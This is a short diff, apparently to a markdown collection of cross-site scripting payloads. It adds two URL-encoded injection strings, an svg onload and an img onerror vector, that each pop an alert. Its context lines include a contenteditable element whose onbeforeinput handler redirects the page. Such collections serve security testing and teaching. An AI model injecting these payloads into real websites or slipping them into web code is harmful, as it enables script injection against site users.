@@ -16,4 +16,8 @@
           contenteditable
           onbeforeinput='location=b.value+c.value+d.value'>
 
+%3Csvg%20onload=alert(%22MrHex88%22)%3E
+
+%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
+
 ```
